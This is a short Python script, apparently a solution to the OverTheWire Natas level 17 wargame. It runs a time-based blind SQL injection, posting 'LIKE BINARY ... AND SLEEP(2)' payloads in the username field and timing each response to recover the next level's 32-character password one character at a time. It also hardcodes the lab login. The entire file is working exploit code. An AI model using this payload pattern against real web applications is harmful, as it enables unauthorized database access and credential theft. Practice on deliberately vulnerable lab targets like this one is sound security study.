import requests
import time

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas17.natas.labs.overthewire.org/"
natas18_pw = ""

n = 0
session = requests.session()
while True:
    for ch in words:
        n += 1
        temp_pw = natas18_pw + ch
        print(f"Try {n} times ({len(temp_pw)} bits): {temp_pw}")

        startTime = time.time()

        payload = f'natas18" AND password LIKE BINARY "' + temp_pw + '%" AND SLEEP(2) #'
        response = session.post(
            url, data={"username": payload}, auth=(username, password)
        )

        endTime = time.time()

        if endTime - startTime > 2:
            natas18_pw = temp_pw
            break

    if len(natas18_pw) == 32:
        print("Finish!")
        break
